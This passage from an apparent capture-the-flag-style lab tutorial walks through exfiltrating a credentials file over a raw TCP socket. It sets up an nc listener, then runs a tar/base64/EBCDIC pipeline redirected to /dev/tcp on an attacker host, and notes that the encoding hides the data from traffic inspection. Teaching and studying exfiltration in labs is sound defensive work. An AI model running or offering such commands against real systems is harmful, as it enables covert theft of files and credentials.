

First, we need to prepare a listener on the **JumpBox** on a port you specify. In our case, we choose port 8080.  

Listening on port TCP/8080 in the JumpBox  

           
			
			
```
thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data Listening on [0.0.0.0] (family 0, port 8080)
```



From the previous command, we used the nc command to receive data on port 8080. Then, once we receive the data, we store it in the /tmp/ directory and call it task4-creds.data as a filename.

Now let's connect to our victim machine that contains the data that needs to be transmitted using the following credential: thm:tryhackme. Note that to connect to the victim1 from the JumpBox, we can use the internal domain name as follows,

Connect to the victim from the JumpBox  

```       
	thm@jump-box$ ssh thm@victim1.thm.com
```

We can also connect directly from the AttackBox using port 2022 as follows,

Connect to the victim from the AttackBox  

```           
root@AttackBox$ ssh thm@10.10.34.65 -p 2022`

```    

We have the required data ready to be transmitted on the victim machine. In this case, we have a sample file with a couple of credentials.

Checking the creds.txt file on the victim machine  

```
thm@victim1:~$ cat task4/creds.txt admin:password Admin:123456 root:toor
```

Now that we have the credential text file, we will use the TCP socket to exfiltrate it. **Make sure the listener is running on the JumpBox**.

Exfiltrate Data over TCP Socket from the victim machine!  

```
thm@victim1:$ tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080 0+1 records in 0+1 records out 260 bytes copied, 9.8717e-05 s, 2.6 MB/s
```


Let's break down the previous command and explain it:

1.  We used the tar command to create an archive file with the zcf arguments of the content of the secret directory.
2.  The z is for using gzip to compress the selected folder, the c is for creating a new archive, and the f is for using an archive file.
3.  We then passed the created tar file to the base64 command for converting it to base64 representation.
4.  Then, we passed the result of the base64 command to create and copy a backup file with the dd command using EBCDIC encoding data.
5.  Finally, we redirect the dd command's output to transfer it using the TCP socket on the specified IP and port, which in this case, port 8080.

Note that we used the Base64 and EBCDIC encoding to protect the data during the exfiltration. If someone inspects the traffic, it would be in a non-human readable format and wouldn't reveal the transmitted file type.

Once we hit enter, we should receive the encoded data in the /tmp/ directory.

Checking the received data on the JumpBox   

           
```
thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data Listening on [0.0.0.0] (family 0, port 8080) Connection from 192.168.0.101 received!  thm@jump-box$ ls -l /tmp/ -rw-r--r-- 1 root root       240 Apr  8 11:37 task4-creds.data
```

On the JumpBox, we need to convert the received data back to its original status. We will be using the dd tool to convert it back. 

Restoring the tar file  

```
thm@jump-box$ cd /tmp/ thm@jump-box:/tmp/$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar 0+1 records in 0+1 records out 260 bytes transferred in 0.000321 secs (810192 bytes/sec)
```

The following is the explanation of the previous command:

1.  We used the dd command to convert the received file to ASCII  representation. We used the task4-creds.data as input to the dd command. 
2.  The output of the dd command will be passed to the base64 to decode it using the -d argument.
3.  Finally, we save the output in the task4-creds.tar  file.

Next, we need to use the tar command to unarchive the task4-creds.tar file and check the content as follows,

Uncompressing the tar file  

```
thm@jump-box$ tar xvf task4-creds.tar task4/  task4/creds.txt
```

Let's break down the previous command and explain it:

1.  We used the tar command to unarchive the file with the xvf arguments.
2.  The x is for extracting the tar file, the v for verbosely listing files, and the f is for using an archive file.

Now let's confirm that we have the same data from the victim machine.

Confirming the received data  

```
thm@jump-box$ cat task4/creds.txt admin:password Admin:123456 root:toor`

```

Success! We exfiltrated data from a victim machine to an attacker machine using the TCP socket in this task.